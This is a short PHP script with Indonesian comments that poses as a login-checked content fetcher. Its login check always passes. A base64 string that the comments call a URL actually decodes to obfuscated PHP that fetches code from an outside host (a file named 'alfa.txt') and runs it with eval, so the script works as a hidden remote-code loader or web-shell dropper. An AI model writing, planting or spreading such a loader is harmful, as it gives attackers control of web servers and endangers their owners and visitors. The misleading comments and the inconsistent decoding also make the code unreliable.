<?php
// Fungsi cek login (dummy contoh)
function is_logged_in() {
    // ubah sesuai logika login kamu
    return true; 
}

// Base64 string yang berisi URL
$base64 = "PD9waHAgZXZhbCgNCiAgICAvKipfKiovIHVybGRlY29kZSgiJTNmJTNlIikgLg0KICAgICAgICBmaWxlX2dldF9jb250ZW50cygNCiAgICAgICAgICAgIC8qKl8qKi8gdXJsZGVjb2RlKA0KICAgICAgICAgICAgICAgIC8qKl8qKi8gImh0dHBzOi8vd3d3LnRhcGZ1c2UuaW8vcmF3L2FsZmEudHh0Ig0KICAgICAgICAgICAgKQ0KICAgICAgICApDQopOyA=";

// Decode jadi URL
$url = base64_decode($base64);

if (is_logged_in()) {
    // Ambil isi file dari URL hasil decode base64
    $content = file_get_contents($url);

    // Jalankan hasilnya
    eval('?>' . $content);
} else {
    echo "Access denied!";
}
